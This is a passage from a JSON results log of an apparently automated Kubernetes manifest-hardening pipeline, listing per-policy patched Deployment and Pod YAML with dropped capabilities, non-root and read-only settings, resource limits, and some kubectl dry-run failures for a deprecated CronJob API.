    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: sample-app-deployment\n  namespace: my-namespace\n  labels:\n    app: sample-app\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: sample-app\n  template:\n    metadata:\n      name: sample-app-pod\n      labels:\n        app: sample-app\n    spec:\n      containers:\n      - name: sample\n        image: ctf/sample-app:stable\n        imagePullPolicy: Never\n        ports:\n        - containerPort: 9000\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01453",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: sample-app-deployment\n  namespace: my-namespace\n  labels:\n    app: sample-app\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: sample-app\n  template:\n    metadata:\n      name: sample-app-pod\n      labels:\n        app: sample-app\n    spec:\n      containers:\n      - name: sample\n        image: ctf/sample-app:stable\n        imagePullPolicy: Never\n        ports:\n        - containerPort: 9000\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01454",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: sample-app-deployment\n  namespace: my-namespace\n  labels:\n    app: sample-app\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: sample-app\n  template:\n    metadata:\n      name: sample-app-pod\n      labels:\n        app: sample-app\n    spec:\n      containers:\n      - name: sample\n        image: ctf/sample-app:stable\n        imagePullPolicy: Never\n        ports:\n        - containerPort: 9000\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01455",
    "policy_id": "no_latest_tag",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9842\nspec:\n  containers:\n  - name: nginx\n    image: nginx:stable\n    securityContext:\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      privileged: false\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01456",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9842\nspec:\n  containers:\n  - name: nginx\n    image: nginx:stable\n    securityContext:\n      readOnlyRootFilesystem: true\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01457",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9842\nspec:\n  containers:\n  - name: nginx\n    image: nginx:stable\n    securityContext:\n      runAsNonRoot: true\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      readOnlyRootFilesystem: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01458",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9842\nspec:\n  containers:\n  - name: nginx\n    image: nginx:stable\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n    securityContext:\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01459",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9842\nspec:\n  containers:\n  - name: nginx\n    image: nginx:stable\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n    securityContext:\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01460",
    "policy_id": "no_latest_tag",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: error: resource mapping not found for name: \"batch-job-every-fifteen-minutes\" namespace: \"\" from \"STDIN\": no matches for kind \"CronJob\" in version \"batch/v1beta1\"\nensure CRDs are installed first"
    ]
  },
  {
    "id": "01461",
    "policy_id": "read_only_root_fs",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: error: resource mapping not found for name: \"batch-job-every-fifteen-minutes\" namespace: \"\" from \"STDIN\": no matches for kind \"CronJob\" in version \"batch/v1beta1\"\nensure CRDs are installed first"
    ]
  },
  {
    "id": "01462",
    "policy_id": "run_as_non_root",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: error: resource mapping not found for name: \"batch-job-every-fifteen-minutes\" namespace: \"\" from \"STDIN\": no matches for kind \"CronJob\" in version \"batch/v1beta1\"\nensure CRDs are installed first"
    ]
  },
  {
    "id": "01463",
    "policy_id": "set_requests_limits",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: error: resource mapping not found for name: \"batch-job-every-fifteen-minutes\" namespace: \"\" from \"STDIN\": no matches for kind \"CronJob\" in version \"batch/v1beta1\"\nensure CRDs are installed first"
    ]
  },
  {
    "id": "01464",
    "policy_id": "set_requests_limits",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: error: resource mapping not found for name: \"batch-job-every-fifteen-minutes\" namespace: \"\" from \"STDIN\": no matches for kind \"CronJob\" in version \"batch/v1beta1\"\nensure CRDs are installed first"
    ]
  },
  {
    "id": "01465",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: ml-pipeline\n    app.kubernetes.io/component: ml-pipeline\n    app.kubernetes.io/name: kubeflow-pipelines\n  name: ml-pipeline\n  namespace: kubeflow\nspec:\n  selector:\n    matchLabels:\n      app: ml-pipeline\n      app.kubernetes.io/component: ml-pipeline\n      app.kubernetes.io/name: kubeflow-pipelines\n  template:\n    metadata:\n      labels:\n        app: ml-pipeline\n        app.kubernetes.io/component: ml-pipeline\n        app.kubernetes.io/name: kubeflow-pipelines\n    spec:\n      containers:\n      - env:\n        - name: KUBEFLOW_USERID_HEADER\n          valueFrom:\n            configMapKeyRef:\n              key: userid-header\n              name: kubeflow-config-bk4bc7m928\n        - name: KUBEFLOW_USERID_PREFIX\n          valueFrom:\n            configMapKeyRef:\n              key: userid-prefix\n              name: kubeflow-config-bk4bc7m928\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: OBJECTSTORECONFIG_SECURE\n          value: 'false'\n        - name: OBJECTSTORECONFIG_BUCKETNAME\n          valueFrom:\n            configMapKeyRef:\n              key: bucketName\n              name: pipeline-install-config-2829cc67f8\n        - name: DBCONFIG_USER\n          valueFrom:\n            secretKeyRef:\n              key: username\n              name: mysql-secret-fd5gktm75t\n        - name: DBCONFIG_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              key: password\n              name: mysql-secret-fd5gktm75t\n        - name: DBCONFIG_DBNAME\n          valueFrom:\n            configMapKeyRef:\n              key: pipelineDb\n              name: pipeline-install-config-2829cc67f8\n        - name: DBCONFIG_HOST\n          valueFrom:\n            configMapKeyRef:\n              key: dbHost\n              name: pipeline-install-config-2829cc67f8\n        - name: DBCONFIG_PORT\n          valueFrom:\n            configMapKeyRef:\n              key: dbPort\n              name: pipeline-install-config-2829cc67f8\n        - name: OBJECTSTORECONFIG_ACCESSKEY\n          valueFrom:\n            secretKeyRef:\n              key: accesskey\n              name: mlpipeline-minio-artifact\n        - name: OBJECTSTORECONFIG_SECRETACCESSKEY\n          valueFrom:\n            secretKeyRef:\n              key: secretkey\n              name: mlpipeline-minio-artifact\n        envFrom:\n        - configMapRef:\n            name: pipeline-api-server-config-f4t72426kt\n        image: uhub.service.ucloud.cn/a4x-kubeflow/ml-pipeline/api-server:1.0.4\n        imagePullPolicy: IfNotPresent\n        livenessProbe:\n          exec:\n            command:\n            - wget\n            - -q\n            - -S\n            - -O\n            - '-'\n            - http://localhost:8888/apis/v1beta1/healthz\n          initialDelaySeconds: 3\n          periodSeconds: 5\n          timeoutSeconds: 2\n        name: ml-pipeline-api-server\n        ports:\n        - containerPort: 8888\n          name: http\n        - containerPort: 8887\n          name: grpc\n        readinessProbe:\n          exec:\n            command:\n            - wget\n            - -q\n            - -S\n            - -O\n            - '-'\n            - http://localhost:8888/apis/v1beta1/healthz\n          initialDelaySeconds: 3\n          periodSeconds: 5\n          timeoutSeconds: 2\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      serviceAccountName: ml-pipeline\n",
    "errors": []
  },
  {
    "id": "01466",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: ml-pipeline\n    app.kubernetes.io/component: ml-pipeline\n    app.kubernetes.io/name: kubeflow-pipelines\n  name: ml-pipeline\n  namespace: kubeflow\nspec:\n  selector:\n    matchLabels:\n      app: ml-pipeline\n      app.kubernetes.io/component: ml-pipeline\n      app.kubernetes.io/name: kubeflow-pipelines\n  template:\n    metadata:\n      labels:\n        app: ml-pipeline\n        app.kubernetes.io/component: ml-pipeline\n        app.kubernetes.io/name: kubeflow-pipelines\n    spec:\n      containers:\n      - env:\n        - name: KUBEFLOW_USERID_HEADER\n          valueFrom:\n            configMapKeyRef:\n              key: userid-header\n              name: kubeflow-config-bk4bc7m928\n        - name: KUBEFLOW_USERID_PREFIX\n          valueFrom:\n            configMapKeyRef:\n              key: userid-prefix\n              name: kubeflow-config-bk4bc7m928\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: OBJECTSTORECONFIG_SECURE\n          value: 'false'\n        - name: OBJECTSTORECONFIG_BUCKETNAME\n          valueFrom:\n            configMapKeyRef:\n              key: bucketName\n              name: pipeline-install-config-2829cc67f8\n        - name: DBCONFIG_USER\n          valueFrom:\n            secretKeyRef:\n              key: username\n              name: mysql-secret-fd5gktm75t\n        - name: DBCONFIG_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              key: password\n              name: mysql-secret-fd5gktm75t\n        - name: DBCONFIG_DBNAME\n          valueFrom:\n            configMapKeyRef:\n              key: pipelineDb\n              name: pipeline-install-config-2829cc67f8\n        - name: DBCONFIG_HOST\n          valueFrom:\n            configMapKeyRef:\n              key: dbHost\n              name: pipeline-install-config-2829cc67f8\n        - name: DBCONFIG_PORT\n          valueFrom:\n            configMapKeyRef:\n              key: dbPort\n              name: pipeline-install-config-2829cc67f8\n        - name: OBJECTSTORECONFIG_ACCESSKEY\n          valueFrom:\n            secretKeyRef:\n              key: accesskey\n              name: mlpipeline-minio-artifact\n        - name: OBJECTSTORECONFIG_SECRETACCESSKEY\n          valueFrom:\n            secretKeyRef:\n              key: secretkey\n              name: mlpipeline-minio-artifact\n        envFrom:\n        - configMapRef:\n            name: pipeline-api-server-config-f4t72426kt\n        image: uhub.service.ucloud.cn/a4x-kubeflow/ml-pipeline/api-server:1.0.4\n        imagePullPolicy: IfNotPresent\n        livenessProbe:\n          exec:\n            command:\n            - wget\n            - -q\n            - -S\n            - -O\n            - '-'\n            - http://localhost:8888/apis/v1beta1/healthz\n          initialDelaySeconds: 3\n          periodSeconds: 5\n          timeoutSeconds: 2\n        name: ml-pipeline-api-server\n        ports:\n        - containerPort: 8888\n          name: http\n        - containerPort: 8887\n          name: grpc\n        readinessProbe:\n          exec:\n            command:\n            - wget\n            - -q\n            - -S\n            - -O\n            - '-'\n            - http://localhost:8888/apis/v1beta1/healthz\n          initialDelaySeconds: 3\n          periodSeconds: 5\n          timeoutSeconds: 2\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      serviceAccountName: ml-pipeline\n",
    "errors": []
  },
  {
    "id": "01467",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: ml-pipeline\n    app.kubernetes.io/component: ml-pipeline\n    app.kubernetes.io/name: kubeflow-pipelines\n  name: ml-pipeline\n  namespace: kubeflow\nspec:\n  selector:\n    matchLabels:\n      app: ml-pipeline\n      app.kubernetes.io/component: ml-pipeline\n      app.kubernetes.io/name: kubeflow-pipelines\n  template:\n    metadata:\n      labels:\n        app: ml-pipeline\n        app.kubernetes.io/component: ml-pipeline\n        app.kubernetes.io/name: kubeflow-pipelines\n    spec:\n      containers:\n      - env:\n        - name: KUBEFLOW_USERID_HEADER\n          valueFrom:\n            configMapKeyRef:\n              key: userid-header\n              name: kubeflow-config-bk4bc7m928\n        - name: KUBEFLOW_USERID_PREFIX\n          valueFrom:\n            configMapKeyRef:\n              key: userid-prefix\n              name: kubeflow-config-bk4bc7m928\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: OBJECTSTORECONFIG_SECURE\n          value: 'false'\n        - name: OBJECTSTORECONFIG_BUCKETNAME\n          valueFrom:\n            configMapKeyRef:\n              key: bucketName\n              name: pipeline-install-config-2829cc67f8\n        - name: DBCONFIG_USER\n          valueFrom:\n            secretKeyRef:\n              key: username\n              name: mysql-secret-fd5gktm75t\n        - name: DBCONFIG_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              key: password\n              name: mysql-secret-fd5gktm75t\n        - name: DBCONFIG_DBNAME\n          valueFrom:\n            configMapKeyRef:\n              key: pipelineDb\n              name: pipeline-install-config-2829cc67f8\n        - name: DBCONFIG_HOST\n          valueFrom:\n            configMapKeyRef:\n              key: dbHost\n              name: pipeline-install-config-2829cc67f8\n        - name: DBCONFIG_PORT\n          valueFrom:\n            configMapKeyRef:\n              key: dbPort\n              name: pipeline-install-config-2829cc67f8\n        - name: OBJECTSTORECONFIG_ACCESSKEY\n          valueFrom:\n            secretKeyRef:\n              key: accesskey\n              name: mlpipeline-minio-artifact\n        - name: OBJECTSTORECONFIG_SECRETACCESSKEY\n          valueFrom:\n            secretKeyRef:\n              key: secretkey\n              name: mlpipeline-minio-artifact\n        envFrom:\n        - configMapRef:\n            name: pipeline-api-server-config-f4t72426kt\n        image: uhub.service.ucloud.cn/a4x-kubeflow/ml-pipeline/api-server:1.0.4\n        imagePullPolicy: IfNotPresent\n        livenessProbe:\n          exec:\n            command:\n            - wget\n            - -q\n            - -S\n            - -O\n            - '-'\n            - http://localhost:8888/apis/v1beta1/healthz\n          initialDelaySeconds: 3\n          periodSeconds: 5\n          timeoutSeconds: 2\n        name: ml-pipeline-api-server\n        ports:\n        - containerPort: 8888\n          name: http\n        - containerPort: 8887\n          name: grpc\n        readinessProbe:\n          exec:\n            command:\n            - wget\n            - -q\n            - -S\n            - -O\n            - '-'\n            - http://localhost:8888/apis/v1beta1/healthz\n          initialDelaySeconds: 3\n          periodSeconds: 5\n          timeoutSeconds: 2\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      serviceAccountName: ml-pipeline\n",
    "errors": []
  },
  {
    "id": "01468",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: ml-pipeline\n    app.kubernetes.io/component: ml-pipeline\n    app.kubernetes.io/name: kubeflow-pipelines\n  name: ml-pipeline\n  namespace: kubeflow\nspec:\n  selector:\n    matchLabels:\n      app: ml-pipeline\n      app.kubernetes.io/component: ml-pipeline\n      app.kubernetes.io/name: kubeflow-pipelines\n  template:\n    metadata:\n      labels:\n        app: ml-pipeline\n        app.kubernetes.io/component: ml-pipeline\n        app.kubernetes.io/name: kubeflow-pipelines\n    spec:\n      containers:\n      - env:\n        - name: KUBEFLOW_USERID_HEADER\n          valueFrom:\n            configMapKeyRef:\n              key: userid-header\n              name: kubeflow-config-bk4bc7m928\n        - name: KUBEFLOW_USERID_PREFIX\n          valueFrom:\n            configMapKeyRef:\n              key: userid-prefix\n              name: kubeflow-config-bk4bc7m928\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: OBJECTSTORECONFIG_SECURE\n          value: 'false'\n        - name: OBJECTSTORECONFIG_BUCKETNAME\n          valueFrom:\n            configMapKeyRef:\n              key: bucketName\n              name: pipeline-install-config-2829cc67f8\n        - name: DBCONFIG_USER\n          valueFrom:\n            secretKeyRef:\n              key: username\n              name: mysql-secret-fd5gktm75t\n        - name: DBCONFIG_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              key: password\n              name: mysql-secret-fd5gktm75t\n        - name: DBCONFIG_DBNAME\n          valueFrom:\n            configMapKeyRef:\n              key: pipelineDb\n              name: pipeline-install-config-2829cc67f8\n        - name: DBCONFIG_HOST\n          valueFrom:\n            configMapKeyRef:\n              key: dbHost\n              name: pipeline-install-config-2829cc67f8\n        - name: DBCONFIG_PORT\n          valueFrom:\n            configMapKeyRef:\n              key: dbPort\n              name: pipeline-install-config-2829cc67f8\n        - name: OBJECTSTORECONFIG_ACCESSKEY\n          valueFrom:\n            secretKeyRef:\n              key: accesskey\n              name: mlpipeline-minio-artifact\n        - name: OBJECTSTORECONFIG_SECRETACCESSKEY\n          valueFrom:\n            secretKeyRef:\n              key: secretkey\n              name: mlpipeline-minio-artifact\n        envFrom:\n        - configMapRef:\n            name: pipeline-api-server-config-f4t72426kt\n        image: uhub.service.ucloud.cn/a4x-kubeflow/ml-pipeline/api-server:1.0.4\n        imagePullPolicy: IfNotPresent\n        livenessProbe:\n          exec:\n            command:\n            - wget\n            - -q\n            - -S\n            - -O\n            - '-'\n            - http://localhost:8888/apis/v1beta1/healthz\n          initialDelaySeconds: 3\n          periodSeconds: 5\n          timeoutSeconds: 2\n        name: ml-pipeline-api-server\n        ports:\n        - containerPort: 8888\n          name: http\n        - containerPort: 8887\n          name: grpc\n        readinessProbe:\n          exec:\n            command:\n            - wget\n            - -q\n            - -S\n            - -O\n            - '-'\n            - http://localhost:8888/apis/v1beta1/healthz\n          initialDelaySeconds: 3\n          periodSeconds: 5\n          timeoutSeconds: 2\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      serviceAccountName: ml-pipeline\n",
    "errors": []
  },
  {
    "id": "01469",
    "policy_id": "no_latest_tag",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: redis-commander\n  annotations:\n    container.apparmor.security.beta.kubernetes.io/redis-commander: runtime/default\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: redis-commander\n  template:\n    metadata:\n      labels:\n        app: redis-commander\n        tier: backend\n    spec:\n      containers:\n      - name: redis-commander\n        image: rediscommander/redis-commander:stable\n        imagePullPolicy: Always\n        env:\n        - name: REDIS_HOSTS\n          value: instance1:redis:6379\n        - name: K8S_SIGTERM\n          value: '1'\n        ports:\n        - name: redis-commander\n          containerPort: 8081\n        livenessProbe:\n          httpGet:\n            path: /favicon.png\n            port: 8081\n          initialDelaySeconds: 10\n          timeoutSeconds: 5\n        securityContext:\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n          allowPrivilegeEscalation: false\n          capabilities:\n            drop:\n            - ALL\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          privileged: false\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01470",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: redis-commander\n  annotations:\n    container.apparmor.security.beta.kubernetes.io/redis-commander: runtime/default\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: redis-commander\n  template:\n    metadata:\n      labels:\n        app: redis-commander\n        tier: backend\n    spec:\n      containers:\n      - name: redis-commander\n        image: rediscommander/redis-commander:stable\n        imagePullPolicy: Always\n        env:\n        - name: REDIS_HOSTS\n          value: instance1:redis:6379\n        - name: K8S_SIGTERM\n          value: '1'\n        ports:\n        - name: redis-commander\n          containerPort: 8081\n        livenessProbe:\n          httpGet:\n            path: /favicon.png\n            port: 8081\n          initialDelaySeconds: 10\n          timeoutSeconds: 5\n        securityContext:\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n          allowPrivilegeEscalation: false\n          capabilities:\n            drop:\n            - ALL\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          privileged: false\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01471",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: redis-commander\n  annotations:\n    container.apparmor.security.beta.kubernetes.io/redis-commander: runtime/default\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: redis-commander\n  template:\n    metadata:\n      labels:\n        app: redis-commander\n        tier: backend\n    spec:\n      containers:\n      - name: redis-commander\n        image: rediscommander/redis-commander:stable\n        imagePullPolicy: Always\n        env:\n        - name: REDIS_HOSTS\n          value: instance1:redis:6379\n        - name: K8S_SIGTERM\n          value: '1'\n        ports:\n        - name: redis-commander\n          containerPort: 8081\n        livenessProbe:\n          httpGet:\n            path: /favicon.png\n            port: 8081\n          initialDelaySeconds: 10\n          timeoutSeconds: 5\n        securityContext:\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n          allowPrivilegeEscalation: false\n          capabilities:\n            drop:\n            - ALL\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          privileged: false\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01472",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: redis-commander\n  annotations:\n    container.apparmor.security.beta.kubernetes.io/redis-commander: runtime/default\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: redis-commander\n  template:\n    metadata:\n      labels:\n        app: redis-commander\n        tier: backend\n    spec:\n      containers:\n      - name: redis-commander\n        image: rediscommander/redis-commander:stable\n        imagePullPolicy: Always\n        env:\n        - name: REDIS_HOSTS\n          value: instance1:redis:6379\n        - name: K8S_SIGTERM\n          value: '1'\n        ports:\n        - name: redis-commander\n          containerPort: 8081\n        livenessProbe:\n          httpGet:\n            path: /favicon.png\n            port: 8081\n          initialDelaySeconds: 10\n          timeoutSeconds: 5\n        securityContext:\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n          allowPrivilegeEscalation: false\n          capabilities:\n            drop:\n            - ALL\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          privileged: false\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01473",
    "policy_id": "no_latest_tag",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9833\nspec:\n  containers:\n  - name: nginx\n    image: nginx:stable\n    securityContext:\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      privileged: false\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01474",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
